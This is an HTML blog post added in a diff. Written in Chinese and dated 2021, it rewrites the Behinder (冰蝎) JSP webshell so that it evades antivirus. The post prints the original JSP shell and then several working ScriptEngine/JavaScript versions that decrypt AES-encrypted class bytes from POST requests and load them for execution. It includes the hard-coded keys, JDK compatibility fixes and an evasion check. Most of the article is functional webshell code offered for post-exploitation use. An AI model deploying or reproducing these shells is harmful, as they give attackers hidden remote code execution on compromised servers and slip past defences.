@@ -1,0 +1,191 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>冰蝎客户端改写 | 藏青&#39;s BLOG</title>
+
+  
+  <meta name="author" content="藏青">
+  
+
+  
+  <meta name="description" content="知行合一">
+  
+
+  
+  <meta name="keywords" content="渗透 内网 代码审计">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="冰蝎客户端改写"/>
+
+  <meta property="og:site_name" content="藏青&#39;s BLOG"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="藏青&#39;s BLOG" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">藏青&#39;s BLOG</a>
+    </h1>
+    <p class="site-description"></p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">Home</a></li>
+      
+        <li><a href="/archives">Archives</a></li>
+      
+        <li><a href="/categories">Categories</a></li>
+      
+        <li><a href="/links">Links</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>冰蝎客户端改写</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/06/18/冰蝎客户端改写/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-06-18T07:22:24.000Z">
+          2021-06-18
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <p>​             漏洞利用后一般需要拿shell，如果shell不免杀可能容易触发目标的防护，甚至去溯源捕获我们的0day，所以做一个免杀的shell是有必要的，今天刚好看到<code>一种新型Java一句话木马的实现</code>文章，可以通过ScriptEngine来执行我们的代码，由于这种方式执行代码的语法和之前jsp马的实现有些不同，所以可以通过这种方式改写shell来实现免杀。</p>
+<p>​        在要通过ScriptEngine改写shell之前，首先我们要了解冰蝎shell做了什么？</p>
+<span id="more"></span>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;</span><br><span class="line">    &lt;%!<span class="class"><span class="keyword">class</span> <span class="title">U</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;  <span class="comment">//定义类U并继承ClassLoader</span></span><br><span class="line">	U(ClassLoader c)&#123;</span><br><span class="line">		<span class="keyword">super</span>(c) <span class="comment">// 构造方法，执行父类ClassLoader的构造方法</span></span><br><span class="line">		;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Class <span class="title">g</span><span class="params">(<span class="keyword">byte</span> []b)</span></span>&#123;  <span class="comment">//执行defineClass方法</span></span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b,<span class="number">0</span>,b.length);&#125;</span><br><span class="line">		&#125;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">if</span> (request.getMethod().equals(<span class="string">&quot;POST&quot;</span>))&#123; <span class="comment">//判断请求类型</span></span><br><span class="line">String k=<span class="string">&quot;e45e329feb5d925b&quot;</span>;</span><br><span class="line">session.putValue(<span class="string">&quot;u&quot;</span>,k); <span class="comment">//将key写入到session</span></span><br><span class="line">Cipher c=Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">c.init(<span class="number">2</span>,<span class="keyword">new</span> SecretKeySpec(k.getBytes(),<span class="string">&quot;AES&quot;</span>)); <span class="comment">//初始化AES解码器</span></span><br><span class="line"><span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()).g(</span><br><span class="line">c.doFinal(<span class="keyword">new</span> sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())) <span class="comment">//将接收的内容base64解码后进行aes解密</span></span><br><span class="line">) <span class="comment">//创建ClassLoader对象，并调用ClassLoader.defineClass方法将接收的字节码转换为class类。</span></span><br><span class="line">    .newInstance().equals(pageContext);&#125;%&gt; <span class="comment">//创建该类对象并调用该对象的equals方法</span></span><br></pre></td></tr></table></figure>
+
+<p>​        下面了解下如何通过ScriptEngine执行JS代码,DEMO如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ScriptEngine engine = <span class="keyword">new</span> ScriptEngineManager().getEngineByName(<span class="string">&quot;javascript&quot;</span>);</span><br><span class="line">String test666=<span class="string">&quot;print(2+2)&quot;</span>;</span><br><span class="line">engine.eval(test666);</span><br></pre></td></tr></table></figure>
+
+<p>​        下面实现Import的功能,由于JDK8使用importPackage需要通过load进行导入mozilla_compat.js，但JDK7则没有load函数，所以使用下面的语句import在JDK7下运行会报错。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ScriptEngine engine = <span class="keyword">new</span> ScriptEngineManager().getEngineByName(<span class="string">&quot;javascript&quot;</span>);</span><br><span class="line"> String test666=<span class="string">&quot;load(\&quot;nashorn:mozilla_compat.js\&quot;);importPackage(\&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*\&quot;)&quot;</span>;</span><br><span class="line"> engine.eval(test666);</span><br></pre></td></tr></table></figure>
+
+<p>​        可以在load语句处加上异常处理，那么无论load执行是否成功都不会影响后续程序的执行,所以导入数据包的代码如下。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  load(<span class="string">&quot;nashorn:mozilla_compat.js&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">importPackage(Packages.java.util);</span><br><span class="line">importPackage(Packages.javax.crypto);</span><br><span class="line">importPackage(Packages.sun.misc);</span><br><span class="line">importPackage(Packages.javax.crypto.spec);</span><br></pre></td></tr></table></figure>
+
+<p>​        按照冰蝎shell的代码，接下来要定义一个类并实现ClassLoader,但是查了下ScriptEngine的文档，好像没有定义类的操作,但我们仔细想想，其实也不是非要定义一个类不可，只不过是想调用defineClass加载我们传入的类的字节码，所以我们可以直接通过反射调用defineClass方法。下面代码参考<code>一种新型Java一句话木马的实现</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">define</span>(<span class="params">classBytes</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> byteArray = Java.type(<span class="string">&quot;byte[]&quot;</span>);</span><br><span class="line">  <span class="keyword">var</span> int = Java.type(<span class="string">&quot;int&quot;</span>);</span><br><span class="line">  <span class="keyword">var</span> defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(</span><br><span class="line">    <span class="string">&quot;defineClass&quot;</span>,</span><br><span class="line">    byteArray.class,</span><br><span class="line">    int.class,</span><br><span class="line">    int.class</span><br><span class="line">  );</span><br><span class="line">  defineClassMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">var</span> cc = defineClassMethod.invoke(</span><br><span class="line">    Thread.currentThread().getContextClassLoader(),</span><br><span class="line">    classBytes,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    classBytes.length</span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">return</span> cc.getConstructor().newInstance();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​            由于冰蝎客户端需要一些对象，所以在创建ScriptEngine后需要绑定对象。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ScriptEngine engine = <span class="keyword">new</span> ScriptEngineManager().getEngineByName(<span class="string">&quot;js&quot;</span>);</span><br><span class="line">engine.put(<span class="string">&quot;request&quot;</span>, request);</span><br><span class="line">engine.put(<span class="string">&quot;response&quot;</span>, response);</span><br><span class="line">engine.put(<span class="string">&quot;session&quot;</span>, session);</span><br><span class="line">engine.put(<span class="string">&quot;pageContext&quot;</span>, pageContext);</span><br></pre></td></tr></table></figure>
+
+<p>​            剩下的似乎没有什么难点，我直接给出我改写后的内容</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  load(<span class="string">&quot;nashorn:mozilla_compat.js&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">importPackage(Packages.java.util);</span><br><span class="line">importPackage(Packages.java.lang);</span><br><span class="line">importPackage(Packages.javax.crypto);</span><br><span class="line">importPackage(Packages.sun.misc);</span><br><span class="line">importPackage(Packages.javax.crypto.spec);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">define</span>(<span class="params">classBytes</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> byteArray = Java.type(<span class="string">&quot;byte[]&quot;</span>);</span><br><span class="line">  <span class="keyword">var</span> int = Java.type(<span class="string">&quot;int&quot;</span>);</span><br><span class="line">  <span class="keyword">var</span> defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(</span><br><span class="line">    <span class="string">&quot;defineClass&quot;</span>,</span><br><span class="line">    byteArray.class,</span><br><span class="line">    int.class,</span><br><span class="line">    int.class</span><br><span class="line">  );</span><br><span class="line">  defineClassMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">var</span> cc = defineClassMethod.invoke(</span><br><span class="line">    Thread.currentThread().getContextClassLoader(),</span><br><span class="line">    classBytes,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    classBytes.length</span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">return</span> cc.getConstructor().newInstance().equals(pageContext);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (request.getMethod().equals(<span class="string">&quot;POST&quot;</span>))&#123;</span><br><span class="line">      <span class="keyword">var</span> k=<span class="string">&quot;39236cce7e199d43&quot;</span>;</span><br><span class="line">      session.putValue(<span class="string">&quot;u&quot;</span>,k);</span><br><span class="line">      <span class="keyword">var</span> c=Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">      c.init(<span class="number">2</span>,<span class="keyword">new</span> SecretKeySpec(k.getBytes(),<span class="string">&quot;AES&quot;</span>));</span><br><span class="line">      define(c.doFinal(<span class="keyword">new</span> BASE64Decoder().decodeBuffer(request.getReader().readLine())))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        在使用的时候遇到了一个BUG，第一次请求正常，第二次请求会爆类重复加载的异常。</p>
+<p><img src="/2021/06/18/%E5%86%B0%E8%9D%8E%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%B9%E5%86%99/image-20210619171644662.png" alt="image-20210619171644662"></p>
+<p>​        经过排错，当通过反射调用时，每次调用defineClass使用的是WebAppClassLoader，这个Loader对于每个web应用是唯一的，下一次再去请求defineClass就会导致重复加载。</p>
+<p><img src="/2021/06/18/%E5%86%B0%E8%9D%8E%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%B9%E5%86%99/image-20210621164620593.png" alt="image-20210621164620593"></p>
+<p>​        而使用冰蝎自带的马去请求，每次请求都会创建一个新的classloader,所以不会出现重复加载类的异常。</p>
+<p><img src="/2021/06/18/%E5%86%B0%E8%9D%8E%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%B9%E5%86%99/image-20210621164844859.png" alt="image-20210621164844859"></p>
+<p><img src="/2021/06/18/%E5%86%B0%E8%9D%8E%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%B9%E5%86%99/image-20210621165042946.png" alt="image-20210621165042946"></p>
+<p>​                所以现在实现思路为在JSP中首先使用JAVA代码创建一个继承了ClassLoader的类，创建一个该类的对象，并将对象进行绑定，在JS中调用该对象定义的方法，下面是我在jdk8的实现。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  load(<span class="string">&quot;nashorn:mozilla_compat.js&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">importPackage(Packages.java.util);</span><br><span class="line">importPackage(Packages.java.lang);</span><br><span class="line">importPackage(Packages.javax.crypto);</span><br><span class="line">importPackage(Packages.sun.misc);</span><br><span class="line">importPackage(Packages.javax.crypto.spec);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">define</span>(<span class="params">classBytes</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> defineClassMethod =test2.getClass().getDeclaredMethod(</span><br><span class="line">    <span class="string">&quot;g&quot;</span>,</span><br><span class="line">    classBytes.getClass()</span><br><span class="line">  );</span><br><span class="line">defineClassMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">var</span> cc = defineClassMethod.invoke(</span><br><span class="line">    test2,</span><br><span class="line">    classBytes</span><br><span class="line">  );</span><br><span class="line">  cc.newInstance().equals(pageContext);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (request.getMethod().equals(<span class="string">&quot;POST&quot;</span>))&#123;</span><br><span class="line">      <span class="keyword">var</span> k=<span class="string">&quot;39236cce7e199d43&quot;</span>;</span><br><span class="line">      session.putValue(<span class="string">&quot;u&quot;</span>,k);</span><br><span class="line">      <span class="keyword">var</span> c=Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">      c.init(<span class="number">2</span>,<span class="keyword">new</span> SecretKeySpec(k.getBytes(),<span class="string">&quot;AES&quot;</span>));</span><br><span class="line">      define(c.doFinal(<span class="keyword">new</span> BASE64Decoder().decodeBuffer(request.getReader().readLine())))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        但在JDK6和7使用的解析引擎和JDK8是不同的，上面的代码不能使用，经过兼容性的修改，实现如下：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  load(<span class="string">&quot;nashorn:mozilla_compat.js&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">importPackage(Packages.java.util);</span><br><span class="line">importPackage(Packages.java.lang);</span><br><span class="line">importPackage(Packages.javax.crypto);</span><br><span class="line">importPackage(Packages.sun.misc);</span><br><span class="line">importPackage(Packages.javax.crypto.spec);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">define</span>(<span class="params">classBytes</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> defineClassMethod =test2.getClass().getDeclaredMethod(<span class="string">&quot;g&quot;</span>,classBytes.getClass());</span><br><span class="line">  defineClassMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">var</span> cc=defineClassMethod.invoke(test2,classBytes);</span><br><span class="line">  cc.newInstance().equals(pageContext);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (request.getMethod().equals(<span class="string">&quot;POST&quot;</span>))&#123;</span><br><span class="line">      <span class="keyword">var</span> k=<span class="keyword">new</span> java.lang.String(<span class="string">&quot;39236cce7e199d43&quot;</span>);</span><br><span class="line">      session.putValue(<span class="string">&quot;u&quot;</span>,k);</span><br><span class="line">      <span class="keyword">var</span> c=Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">      c.init(<span class="number">2</span>,<span class="keyword">new</span> SecretKeySpec(k.getBytes(),<span class="string">&quot;AES&quot;</span>));</span><br><span class="line">      define(c.doFinal(<span class="keyword">new</span> BASE64Decoder().decodeBuffer(request.getReader().readLine())));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        但这样实现会在invoke是爆一个类型转换异常。</p>
+<p><img src="/2021/06/18/%E5%86%B0%E8%9D%8E%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%B9%E5%86%99/image-20210622141931784.png" alt="image-20210622141931784"></p>
+<p>​        经过排错，问题主要在<code>sun.org.mozilla.javascript.internal.NativeJavaMethod#call</code>函数中 ，这里会将我们反射方法需要的参数转换为Object[]，但实际上我们传入的是byte[]，byte[]显然不能转为Object[]。</p>
+<p><img src="/2021/06/18/%E5%86%B0%E8%9D%8E%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%B9%E5%86%99/image-20210622142124037.png" alt="image-20210622142124037"></p>
+<p>​        又经过复杂的排错，发现是JS类型和JAVA的类型转换出现了错误，将classBytes通过<code>new Array()</code>转换一下就可以了，下面的代码兼容JDK7\8</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  load(<span class="string">&quot;nashorn:mozilla_compat.js&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">importPackage(Packages.java.util);</span><br><span class="line">importPackage(Packages.java.lang);</span><br><span class="line">importPackage(Packages.javax.crypto);</span><br><span class="line">importPackage(Packages.sun.misc);</span><br><span class="line">importPackage(Packages.javax.crypto.spec);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">define</span>(<span class="params">classBytes</span>)</span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">var</span> defineClassMethod =test2.getClass().getDeclaredMethod(<span class="string">&quot;g&quot;</span>,classBytes.getClass());</span><br><span class="line">  print(defineClassMethod)</span><br><span class="line">  defineClassMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">var</span> cc=defineClassMethod.invoke(test2,<span class="keyword">new</span> <span class="built_in">Array</span>(classBytes));</span><br><span class="line"></span><br><span class="line">  cc.newInstance().equals(pageContext);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (request.getMethod().equals(<span class="string">&quot;POST&quot;</span>))&#123;</span><br><span class="line">      <span class="keyword">var</span> k=<span class="keyword">new</span> java.lang.String(<span class="string">&quot;39236cce7e199d43&quot;</span>);</span><br><span class="line">      session.putValue(<span class="string">&quot;u&quot;</span>,k);</span><br><span class="line">      <span class="keyword">var</span> c=Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">      c.init(<span class="number">2</span>,<span class="keyword">new</span> SecretKeySpec(k.getBytes(),<span class="string">&quot;AES&quot;</span>));</span><br><span class="line">      define(c.doFinal(<span class="keyword">new</span> BASE64Decoder().decodeBuffer(request.getReader().readLine())));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        最后看下免杀效果。</p>
+<p><img src="/2021/06/18/%E5%86%B0%E8%9D%8E%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%B9%E5%86%99/image-20210622153106003.png" alt="image-20210622153106003"></p>
+<p><strong>总结</strong></p>
+<p>​        刚开始实现的时候以为这个实现很简单，没想到实际操作的时候遇到了很多问题，最终在瓜哥的指导下成功解决了版本兼容的问题。</p>
+<p><strong>参考</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9715#toc-15">https://xz.aliyun.com/t/9715#toc-15</a></li>
+</ul>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/webshell/">webshell</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2021 藏青
+    
+  </p>
+</footer>
+    
+    
+  </div>
+</div>
+</body>
+</html>
